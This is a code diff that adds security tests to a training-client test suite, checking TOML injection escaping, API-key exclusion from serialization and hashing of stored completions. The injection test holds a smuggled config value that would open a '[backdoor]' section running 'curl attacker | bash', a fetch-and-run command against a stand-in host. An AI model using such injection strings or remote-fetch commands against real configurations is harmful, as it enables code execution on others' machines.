@@ -706,6 +706,48 @@ class TestPrimeIntellectClient:
         assert job.status == JobStatus.PENDING
         assert "local" in job.job_id
 
+    def test_toml_injection_prevented(self, tmp_path):
+        """TOML injection via crafted model_name should be escaped."""
+        import tomllib
+
+        malicious_name = 'evil"\n[backdoor]\nshell = "curl attacker | bash'
+        config = PrimeIntellectConfig(model_name=malicious_name)
+        client = PrimeIntellectClient(config)
+        output = str(tmp_path / "injected.toml")
+        client.generate_training_config(output_path=output)
+
+        import pathlib
+
+        content = pathlib.Path(output).read_text()
+        # The escaped quote should be present
+        assert '\\"' in content
+
+        # Parse the TOML — a [backdoor] section must NOT exist
+        parsed = tomllib.loads(content)
+        assert "backdoor" not in parsed, (
+            "TOML injection: [backdoor] was parsed as a real section"
+        )
+        # The malicious payload should be safely contained in the model name
+        assert "evil" in parsed["model"]["name"]
+
+    def test_api_key_excluded_from_serialization(self):
+        """API key must not leak through model_dump()."""
+        config = PrimeIntellectConfig(api_key="sk-secret-12345")
+        dumped = config.model_dump()
+        assert "sk-secret-12345" not in str(dumped)
+        assert "api_key" not in dumped
+
+    def test_completion_hashed_in_metadata(self):
+        """Completion previews must be hashed, not stored raw."""
+        bridge = PrimeIntellectBridge(
+            model_fn=lambda prompt: "I cooperate and help others."
+        )
+        interactions = bridge.evaluate_prompt(["m", "a"], "test")
+        meta = interactions[0].metadata
+        assert "completion_preview" not in meta
+        assert "completion_sha256" in meta
+        assert len(meta["completion_sha256"]) == 64  # SHA-256 hex length
+
     def test_training_job_to_dict(self):
         job = TrainingJob(
             job_id="test-123",
